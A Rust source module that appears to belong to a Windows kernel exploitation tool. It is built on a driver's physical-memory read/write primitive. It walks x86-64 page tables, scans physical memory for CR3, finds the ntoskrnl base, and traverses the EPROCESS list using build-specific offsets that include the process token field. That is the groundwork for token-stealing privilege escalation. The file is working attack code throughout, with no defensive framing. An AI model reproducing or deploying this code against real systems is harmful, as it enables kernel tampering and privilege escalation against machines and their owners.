//! Kernel discovery + virtual-address R/W on top of `astra::Astra`.
//!
//! Builds a 4-level x86-64 page-table walker on the physical R/W primitive,
//! then exposes `vread` / `vread_u32` / `vread_u64` / `vwrite` for callers that
//! think in kernel VAs. Also has `find_cr3`, `find_kernel_base`, and the
//! `EPROCESS` walk used to locate System + a target PID.

use std::mem;

use crate::astra::{is_kptr, Astra, KUSD_VA};
use crate::pe::{export_rva, load_image};

// ─── Page table walk ────────────────────────────────────────────────────────

pub fn virt_to_phys(drv: &Astra, cr3: u64, va: u64) -> Option<u64> {
    let pml4_idx = (va >> 39) & 0x1FF;
    let pdpt_idx = (va >> 30) & 0x1FF;
    let pd_idx   = (va >> 21) & 0x1FF;
    let pt_idx   = (va >> 12) & 0x1FF;

    let pml4e = drv.read_u64((cr3 & 0x000F_FFFF_FFFF_F000) + pml4_idx * 8).ok()?;
    if pml4e & 1 == 0 { return None; }

    let pdpte = drv.read_u64((pml4e & 0x000F_FFFF_FFFF_F000) + pdpt_idx * 8).ok()?;
    if pdpte & 1 == 0 { return None; }
    if pdpte & 0x80 != 0 {
        // 1 GiB huge page
        return Some((pdpte & 0x000F_FFFC_0000_0000) | (va & 0x3FFF_FFFF));
    }

    let pde = drv.read_u64((pdpte & 0x000F_FFFF_FFFF_F000) + pd_idx * 8).ok()?;
    if pde & 1 == 0 { return None; }
    if pde & 0x80 != 0 {
        // 2 MiB large page
        return Some((pde & 0x000F_FFFF_FFE0_0000) | (va & 0x1F_FFFF));
    }

    let pte = drv.read_u64((pde & 0x000F_FFFF_FFFF_F000) + pt_idx * 8).ok()?;
    if pte & 1 == 0 { return None; }
    Some((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
}

pub fn vread(drv: &Astra, cr3: u64, va: u64, buf: &mut [u8]) -> Result<(), String> {
    let pa = virt_to_phys(drv, cr3, va)
        .ok_or_else(|| format!("virt_to_phys @ 0x{va:X}"))?;
    drv.read_phys(pa, buf)
}

pub fn vread_u32(drv: &Astra, cr3: u64, va: u64) -> Result<u32, String> {
    let mut b = [0u8; 4]; vread(drv, cr3, va, &mut b)?; Ok(u32::from_le_bytes(b))
}

pub fn vread_u64(drv: &Astra, cr3: u64, va: u64) -> Result<u64, String> {
    let mut b = [0u8; 8]; vread(drv, cr3, va, &mut b)?; Ok(u64::from_le_bytes(b))
}

pub fn vwrite(drv: &Astra, cr3: u64, va: u64, buf: &[u8]) -> Result<(), String> {
    let mut pos = 0usize;
    let mut cur = va;
    while pos < buf.len() {
        let off   = (cur & 0xFFF) as usize;
        let chunk = (buf.len() - pos).min(0x1000 - off);
        let pa = virt_to_phys(drv, cr3, cur)
            .ok_or_else(|| format!("vwrite vtop @ 0x{cur:X}"))?;
        drv.write_phys(pa, &buf[pos..pos+chunk])?;
        pos += chunk;
        cur += chunk as u64;
    }
    Ok(())
}

// ─── CR3 + ntoskrnl base ────────────────────────────────────────────────────

pub fn find_cr3(drv: &Astra) -> Result<u64, String> {
    let kusd_pml4_idx = (KUSD_VA >> 39) & 0x1FF;

    // Phase 1 — collect PML4 candidates from the first 64 MiB
    let mut candidates: Vec<u64> = Vec::new();
    for phys_page in (0u64..0x400_0000).step_by(0x1000) {
        let pml4e = match drv.read_u64(phys_page + kusd_pml4_idx * 8) {
            Ok(v) => v, Err(_) => continue,
        };
        if pml4e & 1 == 0 { continue; }
        let next_pa = pml4e & 0x000F_FFFF_FFFF_F000;
        if next_pa > 0x8_0000_0000 { continue; }
        candidates.push(phys_page);
    }

    // Phase 2 — verify by translating KUSD and checking NtMajorVersion
    for &cr3 in &candidates {
        if let Some(kusd_pa) = virt_to_phys(drv, cr3, KUSD_VA) {
            if let Ok(v) = drv.read_u32(kusd_pa + 0x26C) {
                if v == 10 { return Ok(cr3); }
            }
        }
    }
    Err("CR3 not found".into())
}

/// Walk back from `lstar` (inside KiSystemCall64) to find the page-aligned
/// ntoskrnl MZ header. Validates AMD64 + PE32+ + SizeOfImage covering lstar.
pub fn find_kernel_base(drv: &Astra, cr3: u64, lstar: u64) -> Result<u64, String> {
    let start = lstar & !0xFFF;
    for i in 0..0x4000u64 {
        let va = start.wrapping_sub(i * 0x1000);
        if !is_kptr(va) { break; }
        let pa = match virt_to_phys(drv, cr3, va) { Some(p) => p, None => continue };
        let mut hdr = [0u8; 0x200];
        if drv.read_phys(pa, &mut hdr).is_err() { continue; }
        if hdr[0] != b'M' || hdr[1] != b'Z' { continue; }
        let lfn = u32::from_le_bytes(hdr[0x3C..0x40].try_into().unwrap()) as usize;
        if lfn + 0x54 > hdr.len() { continue; }
        if &hdr[lfn..lfn+4] != b"PE\0\0" { continue; }
        if u16::from_le_bytes(hdr[lfn+4..lfn+6].try_into().unwrap()) != 0x8664 { continue; }
        if u16::from_le_bytes(hdr[lfn+24..lfn+26].try_into().unwrap()) != 0x20B { continue; }
        let size = u32::from_le_bytes(hdr[lfn+0x50..lfn+0x54].try_into().unwrap()) as u64;
        if size < 0x10_0000 { continue; }
        if va + size <= lstar { continue; }
        return Ok(va);
    }
    Err("ntoskrnl base not found".into())
}

/// Walk back page-by-page from `hint_va` until we hit `MZ`. Returns the
/// page-aligned VA of the host module containing `hint_va`.
pub fn find_module_base_walkback(drv: &Astra, cr3: u64, hint_va: u64, max_pages: u64) -> Option<u64> {
    let start = hint_va & !0xFFF;
    for i in 0..max_pages {
        let va = start.wrapping_sub(i * 0x1000);
        if !is_kptr(va) { break; }
        let pa = match virt_to_phys(drv, cr3, va) { Some(p) => p, None => continue };
        let mut hdr = [0u8; 0x40];
        if drv.read_phys(pa, &mut hdr).is_err() { continue; }
        if hdr[0] == b'M' && hdr[1] == b'Z' { return Some(va); }
    }
    None
}

// ─── EPROCESS walk ──────────────────────────────────────────────────────────

#[derive(Clone, Copy, Debug)]
pub struct EprocessOffsets { pub pid: u64, pub links: u64, pub token: u64, pub image_name: u64 }

pub fn get_build_number() -> Result<u32, String> {
    use windows::Win32::System::SystemInformation::OSVERSIONINFOW;
    #[link(name = "ntdll")]
    unsafe extern "system" {
        fn RtlGetVersion(info: *mut OSVERSIONINFOW) -> i32;
    }
    let mut info = OSVERSIONINFOW::default();
    info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
    let st = unsafe { RtlGetVersion(&mut info) };
    if st != 0 { return Err("RtlGetVersion failed".into()); }
    Ok(info.dwBuildNumber)
}

pub fn detect_eprocess_offsets() -> Result<EprocessOffsets, String> {
    let build = get_build_number()?;
    Ok(match build {
        26100..              => EprocessOffsets { pid: 0x1D0, links: 0x1D8, token: 0x248, image_name: 0x338 },
        22000..=26099        => EprocessOffsets { pid: 0x440, links: 0x448, token: 0x4B8, image_name: 0x5A8 },
        19041..=21999        => EprocessOffsets { pid: 0x440, links: 0x448, token: 0x4B8, image_name: 0x5A8 },
        _                    => return Err(format!("unsupported build {build}")),
    })
}

/// Walk the ActiveProcessLinks chain starting from `PsInitialSystemProcess`
/// to locate the System EPROCESS and a target by PID.
pub fn find_eprocess_by_ptwalk(
    drv: &Astra, cr3: u64, nt_kbase: u64, target_pid: u32,
) -> Result<(u64, u64), String> {
    let offsets = detect_eprocess_offsets()?;

    let (nt_disk, _) = load_image("ntoskrnl.exe")?;
    let psisp_rva = export_rva(nt_disk, "PsInitialSystemProcess")
        .ok_or("PsInitialSystemProcess not exported")?;
    let psisp_va = nt_kbase + psisp_rva;
    let sys_va = vread_u64(drv, cr3, psisp_va)?;
    if !is_kptr(sys_va) {
        return Err(format!("PsInitialSystemProcess = 0x{sys_va:X} — not a kernel pointer"));
    }

    let sys_pid = vread_u64(drv, cr3, sys_va + offsets.pid)?;
    if sys_pid != 4 {
        return Err(format!("System EPROCESS PID = {sys_pid} (expected 4)"));
    }
    if target_pid == 4 { return Ok((sys_va, sys_va)); }

    let head_va = vread_u64(drv, cr3, sys_va + offsets.links + 8)?;
    if !is_kptr(head_va) { return Err("PsActiveProcessHead invalid".into()); }
    let head_flink = vread_u64(drv, cr3, head_va)?;

    let mut cur = head_flink;
    for _ in 0..4096 {
        if cur == head_va { break; }
        let ep = cur - offsets.links;
        if let Ok(pid) = vread_u64(drv, cr3, ep + offsets.pid) {
            if pid as u32 == target_pid { return Ok((sys_va, ep)); }
        }
        match vread_u64(drv, cr3, cur) {
            Ok(v) if is_kptr(v) => cur = v,
            _ => break,
        }
    }
    Err(format!("PID {target_pid} not found in EPROCESS list"))
}
